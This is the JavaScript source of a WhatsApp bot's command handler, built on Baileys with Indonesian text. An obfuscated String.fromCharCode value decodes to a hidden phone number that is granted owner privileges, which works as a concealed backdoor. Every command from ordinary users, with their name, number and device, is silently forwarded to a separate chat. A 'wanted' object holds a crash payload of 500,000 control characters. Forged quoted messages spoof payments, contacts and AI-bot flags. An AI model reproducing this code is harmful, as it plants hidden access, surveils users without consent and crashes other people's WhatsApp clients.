/*
  #- Credits By Skyzopedia
   Recode by : Dits
*/
process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const absenData = {}
const permintaan = {}
const laporan = {}
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const cron = require('node-cron');
const axios = require('axios');
const FormData = require('form-data');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");

const nou = require("node-os-utils");
const cheerio = require('cheerio');
const didyoumean = require('didyoumean');
const photooxy = require('./sistem-asuma/photooxy');
const toMs = require('ms')

const similarity = require('similarity')
const threshold = 0.72 
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const { randomBytes } = require('crypto');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { antispam } = require('./sistem-asuma/antispam');
const { TelegraPh, UguuSe } = require('./library/uploader');
const { exec, spawn, execSync } = require('child_process');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, InteractiveMessage, generateMessageIDV2 } = require('@whiskeysockets/baileys');
const Harinih = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
const { 
	CatBox, 
	fileIO, 
	pomfCDN 
} = require('./sistem-asuma/uploader');
const { LoadDataBase } = require('./source/message');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl, spotifyDl } = require('./library/scraper');
//const { CatBox, pomfCDN, CDNmeitang, TelegraPh, UploadFileUgu, webp2mp4File } = require('./sistem-asuma/uploader');
const { mediafiree } = require('./sistem-asuma/mediafire');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');


module.exports = Ditss = async (Ditss, m, chatUpdate, store) => {
	try {
await LoadDataBase(Ditss, m)
const botNumber = await Ditss.decodeJid(Ditss.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
//const prefix = "."
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const makeid = randomBytes(3).toString('hex')
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
		m.device = /^3A/.test(m.id) ? 'ios' : m.id.startsWith('3EB') ? 'web' : /^.{21}/.test(m.id) ? 'android' : /^.{18}/.test(m.id) ? 'desktop' : 'unknown';
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
//const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
const full_args = body.replace(command, '').slice(1).trim()
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const from = m.key.remoteJid
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const nomore = m.sender.replace(/[^0-9]/g, '')
const tag = `@${m.sender.split('@')[0]}`
const taggc = `@${from.split('@')[0]}`
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const sender = m.key.fromMe ? (Ditss.user.id.split(':')[0]+'@s.whatsapp.net' || Ditss.user.id) : (m.key.participant || m.key.remoteJid)
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
// FUNCTION WAKTU
let d = new Date
let gmt = new Date(0).getTime() - new Date('1 Januari 2023').getTime()
const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString('id', { weekday: 'long' })
const calender = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const timestampp = speed();
const latensi = speed() - timestampp
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const salam = 'Selamat '+dt.charAt(0).toUpperCase() + dt.slice(1)
const isBanned = db.users[sender] !== undefined ? db.users[sender].banned : false
const userId = m.sender
const isGroup = m.key.remoteJid.endsWith('@g.us')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const isMedia = /image|video|sticker|audio/.test(mime)
// GROUP METADATA
const groupMetadata = m.isGroup ? await Ditss.groupMetadata(m.chat) :''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter((v) => v.admin !== null).map((i) => i.id) : [] || [];
const groupOwner = m.isGroup ? groupMetadata?.owner : false;
const groups = global.db.groups[m.chat] !== undefined ? global.db.groups[m.chat] : false;
 
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const fsaluran = { key : {
remoteJid: `${nomore}@s.whatsapp.net`,
participant : `${nomore}@s.whatsapp.net`
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363389612565031@newsletter',
    newsletterName: '',
    caption: body
}}}
// FUNCTION SALDO & DATA
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./sistem-asuma/deposit")
let db_saldo = JSON.parse(fs.readFileSync("./library/database/saldo.json"));
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
const ditsganteng = addSaldo(m.sender, 1, db_saldo)
// BATAS SALDO
//const isAntiLinkCh = m.isGroup ? db.chats[m.chat].antilinkch : false;
//const linkRegex = /https?:\/\/(whatsapp\.com\/channel\/[A-Za-z0-9]+)/; 
// PP USERR 
const isSticker = (m.type == 'stickerMessage')
var ppuser
try {
ppuser = await Ditss.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
// FUNCTION Onlygc
//if (!isCreator && global.onlygc && !m.isGroup && isCmd && !['chat', 'menu', 'upch', 'play', 'ai', 'owner', 'allmenu', 'menfes', 'confes', 'confess','menfess','tourl','ytmp3'].includes(command)) return m.reply(`bot sedang mode group🤐`)
        if (!isCreator && global.onlygc && !m.isGroup && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return Ditss.sendMessage(m.chat,
{ text: `maap ka ${tag} bot hanya bisa di gunakan di group\njoin grup kami: https://chat.whatsapp.com/G3m4XDgXuAn4FPNi2jas5z`,
contextInfo:{
mentionedJid:[m.sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `no acces`,
"body": `..`,
"previewType": "PHOTO",
"thumbnailUrl": `https://chat.whatsapp.com/G3m4XDgXuAn4FPNi2jas5z`,
"thumbnailUrl": ppuser,
"sourceUrl": `https://chat.whatsapp.com/G3m4XDgXuAn4FPNi2jas5z`}}},
{ quoted: fsaluran})
// FUNCTION SELF & BATAS COMMAND
//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

        if (isCmd) {
console.log(chalk.green.bgCyan.bold(m.type), chalk.bgWhite(`💬 message 💬`), chalk.blue.bold(`from`), chalk.blue.bold(`${m.sender.split("@")[0]}/${m.pushName}`), chalk.black.bold(`Text :`), chalk.magenta(`${prefix+command} ${text}`))
}
//========= [ FAKEQUOTED ] =========
    const replyAi = async (text) => {
        try {
       //    userSession.limit -= 1;
            const theArray = [
                {
                    attrs: { biz_bot: '1' },
                    tag: "bot"
                },
                {
                    attrs: {},
                    tag: "biz"
                }
            ];
            const gen = {
                conversation: text,
                messageContextInfo: {
                    messageSecret: randomBytes(32),
supportPayload: JSON.stringify({
                        version: 1,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: "1669945700536053",
                    }),
                },
            };

            Ditss.relayMessage(m.chat, gen, {
                messageId: generateMessageIDV2(`${nomore}@s.whatsapp.net`),
                additionalNodes: theArray
            });
        } catch (error) {
            console.error("Error saat membalas:", error);
        }
    };
        //function 
        if ((budy.match) && ["hai","ola","Halo","halo","alo"].includes(budy) && !isCmd) {
//m.reply(`*Iya ?*`)
await Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/alo.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
//
if ((budy.match) && ["*promo*","*balasan*","*balas*","*masuk*","*join*","*group*","*grup*","*grub*","*gb*","*gc*","*jpm*","*stok*","*share*","*bebas*","*mengeluarkan*","*panel*","*adp*"].includes(budy) && !isCmd) {
//m.reply(`*Iya ?*`)
m.reply('*`𝐋𝐢𝐬𝐭 𝐏𝐫𝐨𝐝𝐮𝐤`*\n\nʀᴇsᴇʟʟᴇʀᴘᴀɴᴇʟ : 8ᴋ\n> ᴘᴇʀᴍᴀɴᴇɴ\n\nᴀᴅᴍɪɴ ᴘᴀɴᴇʟ : 10ᴋ\n> ᴘᴇʀᴍᴀɴᴇɴ\n\nᴘᴛ ᴘᴀɴᴇʟ : 15ᴋ\n> ᴘᴇʀᴍᴀɴᴇɴ\n\n𝐋𝐢𝐬𝐭 𝐏𝐚𝐧𝐞𝐥\n> ʀᴀᴍ 1ɢʙ = 1ᴋ\n> ʀᴀᴍ 2ɢʙ = 2ᴋ\n> ʀᴀᴍ 3ɢʙ = 3ᴋ\n> ʀᴀᴍ 4ɢʙ = 4ᴋ\n> ʀᴀᴍ 5ɢʙ = 5ᴋ\n> ʀᴀᴍ ᴜɴʟɪ = 6ᴋ\n\n~𝐋𝐢𝐬𝐭 𝐒𝐞𝐰𝐚 𝐁𝐨𝐭~\n> 7 ʜᴀʀɪ > 5ᴋ\n> 15 ʜᴀʀɪ > 8ᴋ\n> 30 ʜᴀʀɪ > 10ᴋ\n\n𝐋𝐢𝐬𝐭 𝐉𝐚𝐝𝐢 𝐁𝐨𝐭\n> 7ʜᴀʀɪ > 7ᴋ\n> 15ʜᴀʀɪ > 15ᴋ\n> 30ʜᴀʀɪ > 25ᴋ\n\n𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫\n> ʙɪsᴀ ᴄ ᴘᴀɴᴇʟ\n> ʙɪsᴀ ᴄ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ\n> ʙɪsᴀ ᴊᴜᴀʟ ᴘᴀɴᴇʟ\n> ʙɪsᴀ ᴏᴘᴇɴ sᴇᴡᴀ ʙᴏᴛ\n> ʙɪsᴀ ᴏᴘᴇɴ ʙᴏᴛ ᴘᴜsʜᴋᴏɴᴛᴀᴋ\n> ʙɪsᴀ ʙᴜᴀᴛ ʙᴏᴛ ᴡᴀ\n*ʜᴀʀɢᴀ?*\n> 35ᴋ > 1 ʙᴜʟᴀɴ\n> 50ᴋ > ᴘᴇʀᴍᴀɴᴇɴ\n\nᴍɪɴᴀᴛ? ᴄʜᴀᴛ : https://wa.me/628993937289\n\nᴛᴇsᴛɪᴍᴏɴɪ\nhttps://whatsapp.com/channel/0029Vb2K7scK0IBkPoAGgk28\n\n_© Copyright By Kyzo Hosting_')
}
// REPLY WITH TROLI
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: ppuser, surface: 200, message: 'asuma bot', orderTitle: 'by ᴀʟꜰʀᴇᴀᴅ', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
// REPLY WITH DOCUMENT
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: 'asuma',jpegThumbnail: ppuser}}}
//REPLY WITH VN
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
// REPLY API

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
const qkontak = {
key: {
participant: `${nomore}@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=31629821394:+31 6 29821394\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qtext = {key: {remoteJid: "status@broadcast", participant: "31629821394@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "31629821394@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `*AlfreadRorw*`}}}

const qlocJpm = {key: {participant: '31629821394@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot *AlfreadRorw*`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '31629821394@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot *AlfreadRorw*`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '31629821394@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '31629821394@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '31629821394@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `31629821394@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `*AlfreadRorw* - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By *AlfreadRorw*`, "productImageCount": 1}, "businessOwnerJid": `31629821394@s.whatsapp.net`}}}

const qlive = {key: {participant: '31629821394@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By *AlfreadRorw*`,jpegThumbnail: ""}}}
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
    const replyAii = async (text) => {
        try {
    //  userSession.limit -= 1;
            const theArray = [
                {
                    attrs: { biz_bot: '1' },
                    tag: "bot"
                },
                {
                    attrs: {},
                    tag: "biz"
                }
            ];
            const gen = {
                conversation: text,
                messageContextInfo: {
                    messageSecret: randomBytes(2),
supportPayload: JSON.stringify({
                        version: 1,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: "1669945700536053",
                    }),
                },
            };

            Ditss.relayMessage(m.chat, gen, {
                messageId: generateMessageIDV2(Ditss.user.id),
                additionalNodes: theArray
            });
        } catch (error) {
            console.error("Error saat membalas:", error);
        }
    };
    //btas
     async function totalfiturr() {
   const fitur1 = () =>{
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }
 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {

let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return 
console.log("!")
}
}
const totalfitur = await totalfiturr()
//good
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await Ditss.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
        //pp
const reply = async (teks) => {
return Ditss.sendMessage(m.chat, {document: fs.readFileSync("./package.json"), mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", caption: `${teks}`,     fileName: `${botname}`,
    fileLength: 99999999999999,
    pageCount: "100",


    contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: {
bussinessName: 'memek',
businessOwnerJid: `${owner}@s.whatsapp.net` }, forwardedNewsletterMessageInfo: { newsletterName: `${botname2}`, newsletterJid: `0@newsletter`}, 
}}, {quoted: qkontak})
}
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
//ai private 
//=== Game Database ==//
if (isCmd && !isCreator){
Ditss.sendMessage(`${global.DataPc}`,{ text: `WhatsApp ${m.isGroup ? `group\n${groupMetadata.subject}` : !m.isGroup ? 'chatt' : 'gatau'}\nFrom : @${m.sender.split('@')[0]}\nChat : ${prefix+command} ${text}`,
 contextInfo: {
 mentionedJid: [m.sender],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `kazeo md`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: Ditss.decodeJid(Ditss.user.id)  },

 forwardingScore: 999,
 isForwarded: false,
 externalAdReply: {
 showAdAttribution: true, 
 title: `name: ${pushname}\nnomor: ${nomore}`,
 body: `device: ${m.device}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
}
//let tebaklagu = db.game.tebaklagu = []
const onlyGroup = async() => {
let joinbang = `Hallo ${ki}${pushname}${ka}, untuk menggunakan semua fitur *asuma*, harap masukan bot ke group anda terlebih dahulu agar anda dapat akses lebih di dalam group gratis tanpa prabayar\n\nAtau anda bisa membeli akses sewa & premium dari owner\njoin group kami: https://chat.whatsapp.com/FVlNkXGLLvXE9fkdgxviIK`
reply(joinbang)}


Ditss.sendPoll = (vb, name = '', values = [], selectableCount = 1) => {
return  Ditss.sendMessage(vb.chat, {poll: { name, values, selectableCount }})
};

Ditss.sendKontol = async(chat, judul, teks, button, quot) => {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: footer
}),
header: proto.Message.InteractiveMessage.Header.create({
title: judul,
subtitle: namaOwner,
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: button,
}),
contextInfo: {
mentionedJid: [sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: idSaluran,
newsletterName: botname,
serverMessageId: 143
}
}
})
}
}
}, {quoted: quot})

await Ditss.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}

Ditss.enhancer = Ditss.enhancer ? Ditss.enhancer : {};
        
Ditss.autoshalat = Ditss.autoshalat ? Ditss.autoshalat : {}
    let id = m.chat
    if (id in Ditss.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        Ditss.autoshalat[id] = [
            Ditss.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./source/media/dits-pler.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete Ditss.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }
		async function emote(emo) {
			Ditss.sendMessage(m.chat, {
				react: {
					text: emo,
					key: m.key
				}
			});
		}
        global.db.menfess = global.db.menfess ? global.db.menfess : {}
         let mf = Object.values(global.db.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return reply(`Balas Pesan Menfess Mu Di Private Chat`)
          //  if (!/conversation|extended/.test(m.type)) return reply(`Balas dengan teks biasa.`)
            let text = `😄 Hai kak, kamu menerima pesan balasan nih dari ${mf.receiver.split('@')[0]} pesannya : *${body}*`
            await Ditss.sendMessage(mf.from, { text: text }).then(async () => {
               m.reply(`pesan Berhasil Terkirim!!`)
               await sleep(1000)
               delete global.db.menfess[mf.id]
               return !0
            })
         }     
  Ditss.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await Ditss.sendPresenceUpdate('composing', jid)
      return Ditss.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }

//kontal
const userdb = global.db.users[m.sender]
const users = global.db.users

const listall = global.db.listall

const chats = global.db.chats
// FUNCTION ONLY PRIVATE CHAT
        if (global.onlypc) {
        	if (isCmd && m.isGroup && !isCreator && !isPremium){
	         return 
	     }
	}
//pler
		if (!isCreator && !m.key.fromMe && m.message) {
			if (budy.match(`@${global.owner}`)) {
await Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/lusiapa.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
			}
		};
if (command && autodetect) {
const code = fs.readFileSync("./case.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}

// Fungsi untuk mendeteksi kesalahan input perintah
const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
if (!help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
let mean = didyoumean(command, help);
let sim = similarity(command, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && command.toLowerCase() !== mean.toLowerCase()) {

// Pesan untuk orang yang salah menginput perintah
let respon = `
command itu tidak ada mungkin yang kamu maksud ${mean}
`.trim();

let button = [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"${prefix + mean} (${similarityPercentage}%)\",\"id\":\"${prefix + mean}\"}`
}
]

// Fungsi untuk mengirim pesan dan tombol
//Ditss.sendKontol(m.chat, "", respon, button, m)
await Ditss.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `.${mean}`,
      buttonText: { displayText: 'try command' },
      type: 1
    },

  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `what you mean is?`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: respon,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: "maybe this is what you mean?"
   }, 
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `🚮 runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: "https://files.catbox.moe/5hld8z.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
}
}
// FUNCTION ANTI SPAM by ᴀʟꜰʀᴇᴀᴅ
if (global.antispam && command) {
if (antispam.isFiltered(m.sender)) {
await Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/spam1.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
await Ditss.sendMessage(m.chat, {react: {text: '😡', key: m.key}})
return;
} else if (command) {
antispam.addFilter(m.sender)
}
}
//============= [ EVENT GROUP ] ===============================================
const asumaSaldo = ` ${toRupiah(cekSaldo(m.sender, db_saldo))}`
const example = (teks) => {
return `\n *Penggunaan Salah!*\n`
}
const isNumber = x => typeof x === 'number' && !isNaN(x)
try {
let user = db.users[sender]
if (user) {
if (typeof user !== 'object') db.users[sender] = {}
if (!('jid' in user)) user.jid = sender
if (!('name' in user)) user.name = pushname
if (!('date' in user)) user.date = calender
if (!isNumber(user.limit)) user.limit = 1000
if (!('hitcmd' in user)) user.hitcmd = 0
if (!isNumber(user.balance)) user.balance = 10000
if (!('banned' in user)) user.banned = false
if (!('premium' in user)) user.premium = false
if (!isNumber(user.expired)) user.expired = Date.now() + toMs('7d')
